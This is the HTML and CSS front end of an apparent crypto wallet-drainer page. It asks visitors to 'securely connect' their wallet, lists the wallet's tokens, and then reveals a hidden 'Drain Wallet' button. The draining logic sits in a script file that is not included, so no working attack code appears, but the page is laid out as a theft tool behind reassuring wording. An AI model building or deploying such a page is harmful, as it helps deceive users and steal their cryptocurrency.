<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Connect Wallet</title>

  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #121212;
      color: #ffffff;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .card {
      background-color: #1e1e1e;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.35);
      width: 100%;
      max-width: 500px;
      text-align: center;
    }

    .card h1 {
      margin-bottom: 10px;
      font-size: 24px;
    }

    .subtitle {
      font-size: 14px;
      color: #aaaaaa;
      margin-bottom: 25px;
    }

    button {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.2s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      margin-bottom: 15px;
    }

    .connect-btn {
      background-color: #4caf50;
      color: #ffffff;
    }

    .connect-btn:hover {
      background-color: #43a047;
    }

    .drain-btn {
      background-color: #f44336;
      color: #ffffff;
    }

    .drain-btn:hover {
      background-color: #d32f2f;
    }

    .drain-btn.hidden {
      display: none;
    }

    .continue-btn {
      background-color: #2196f3;
      color: #ffffff;
    }

    .continue-btn:hover {
      background-color: #1e88e5;
    }

    .continue-btn.hidden {
      display: none;
    }

    .status {
      margin-top: 18px;
      font-size: 14px;
      color: #cccccc;
      min-height: 60px;
      padding: 10px;
      background-color: #161616;
      border-radius: 8px;
      text-align: left;
      line-height: 1.6;
      white-space: pre-line;
      word-break: break-all;
    }

    .wallet-info {
      margin-top: 18px;
      padding: 12px;
      background-color: #161616;
      border-radius: 8px;
      font-size: 13px;
      text-align: left;
      line-height: 1.6;
      word-break: break-all;
    }

    .tokens-container {
      margin-top: 20px;
      padding: 15px;
      background-color: #161616;
      border-radius: 8px;
      max-height: 300px;
      overflow-y: auto;
    }

    .tokens-container h3 {
      margin-top: 0;
      margin-bottom: 15px;
      color: #4caf50;
      font-size: 16px;
    }

    .token-item {
      padding: 10px;
      border-bottom: 1px solid #2a2a2a;
      margin-bottom: 8px;
    }

    .token-item:last-child {
      border-bottom: none;
      margin-bottom: 0;
    }

    .token-symbol {
      color: #ffffff;
      font-weight: bold;
    }

    .token-amount {
      color: #4caf50;
    }

    .token-name {
      color: #aaaaaa;
      font-size: 12px;
    }

    .hidden {
      display: none;
    }
  </style>
</head>

<body>
  <main class="container">
    <div class="card">
      <h1>Connect Your Wallet</h1>
      <p class="subtitle">
        Securely connect your wallet to continue
      </p>

      <!-- CONNECT BUTTON -->
      <button id="connectBtn" class="connect-btn">
        Connect Wallet
      </button>

      <!-- STATUS MESSAGE -->
      <div id="status" class="status">Not connected</div>

      <!-- TOKENS DISPLAY -->
      <div id="tokensContainer" class="tokens-container hidden">
        <h3>Wallet Tokens</h3>
        <div id="tokens"></div>
      </div>

      <!-- DRAIN BUTTON (HIDDEN INITIALLY) -->
      <button id="drainBtn" class="drain-btn hidden">
        Drain Wallet
      </button>

      <!-- CONTINUE BUTTON -->
      <button id="continueBtn" class="continue-btn hidden">
        Continue
      </button>
    </div>
  </main>

  <!-- MAIN SCRIPT -->
  <script type="module" src="/main.js"></script>
</body>
</html>
